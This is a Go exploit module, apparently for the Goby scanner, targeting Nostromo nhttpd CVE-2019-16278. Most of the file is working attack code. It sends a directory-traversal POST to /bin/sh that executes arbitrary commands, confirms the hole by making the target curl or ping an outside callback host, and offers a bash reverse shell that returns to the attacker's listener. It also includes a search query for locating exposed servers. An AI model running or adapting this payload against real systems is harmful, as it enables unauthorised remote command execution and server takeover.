package exploits

import (
	"bufio"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Nostromo nhttpd RCE (CVE-2019-16278)",
    "Description": "Directory Traversal in the function http_verify in nostromo nhttpd through 1.9.6 allows an attacker to achieve remote code execution via a crafted HTTP request.",
    "Impact": "Nostromo nhttpd RCE (CVE-2019-16278)",
    "Recommendation": "<p>1. Upgrade Patches</p>",
    "Product": "nostromo",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Nostromo nhttpd远程代码执行",
            "Description": "nostromo nhttpd是一款开源的Web服务器。 nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。",
            "Impact": "<p>攻击者可在服务器上执行任意命令，写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。</p>",
            "Recommendation": "<p>1、&nbsp;目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：<a href=\"http://www.nazgul.ch \" target=\"_blank\">http://www.nazgul.ch&nbsp;</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Product": "nostromo",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Nostromo nhttpd RCE (CVE-2019-16278)",
            "Description": "Directory Traversal in the function http_verify in nostromo nhttpd through 1.9.6 allows an attacker to achieve remote code execution via a crafted HTTP request.",
            "Impact": "Nostromo nhttpd RCE (CVE-2019-16278)",
            "Recommendation": "<p>1.&nbsp;Upgrade Patches</p>",
            "Product": "nostromo",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(header=\"Server: nostromo\" || banner=\"Server: nostromo \")",
    "GobyQuery": "(header=\"Server: nostromo\" || banner=\"Server: nostromo \")",
    "Author": "李大壮",
    "Homepage": "http://www.nazgul.ch/dev_nostromo.html",
    "DisclosureDate": "2021-05-27",
    "References": [
        "https://www.exploit-db.com/exploits/47837"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2019-16278"
    ],
    "CNVD": [
        "CNVD-2019-36988"
    ],
    "CNNVD": [
        "CNNVD-201910-807"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "cmd,goby_shell_linux",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10770"
}`

	postDataWithHTTP10 := func(u *httpclient.FixUrl, cmd string) string {
		conn, err := httpclient.GetTCPConn(u.HostInfo)
		if err != nil {
			return ""
		}
		payload := "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n" + cmd
		_, err = conn.Write([]byte(payload))
		if err != nil {
			return ""
		}
		resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
		if err != nil {
			return ""
		}
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return ""
		}
		return string(body)
	}
	postData := func(u *httpclient.FixUrl, cmd string) {
		vulUri := "/.%0d./.%0d./.%0d./.%0d./bin/sh"
		cfg := httpclient.NewPostRequestConfig(vulUri)
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.VerifyTls = false
		cfg.Data = fmt.Sprintf("\necho\necho\n%s", cmd)
		httpclient.DoHttpRequest(u, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(6)
			respBody := postDataWithHTTP10(u, "echo "+checkStr)
			if strings.TrimSpace(respBody) == checkStr {
				return true
			}
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			cmd := "curl " + checkUrl
			if isDomain {
				cmd = "ping -c 1 " + checkUrl
			}
			postData(u, cmd)
			return godclient.PullExists(checkStr, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["AttackType"].(string)
			if attackType == "cmd" {
				respBody := postDataWithHTTP10(expResult.HostInfo, ss.Params["cmd"].(string))
				if len(respBody) > 0 {
					expResult.Success = true
					expResult.Output = respBody
				}
			} else if attackType == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					postData(expResult.HostInfo, cmd)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			}
			return expResult
		},
	))
}
